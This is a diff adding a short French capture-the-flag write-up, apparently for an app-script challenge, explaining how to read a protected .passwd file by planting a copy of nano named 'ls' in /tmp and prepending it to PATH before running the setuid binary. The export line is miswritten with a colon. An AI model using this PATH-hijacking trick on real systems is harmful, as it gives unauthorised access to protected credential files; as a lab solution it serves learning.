@@ -1,0 +1,7 @@
+On sait que ch12 va executer "ls -lA /challenge/app-script/ch12/.passwd".
+Or on veut pas ls mais afficher le .passwd.
+On va donc remplacer ls par nano (et pas par cat à cause de -lA) :
+    mkdir /tmp/werenn
+    cp /bin/nano /tmp/werenn/ls
+    export PATH:"/tmp/werenn:$PATH"
+On exécute ch12 et bingo.
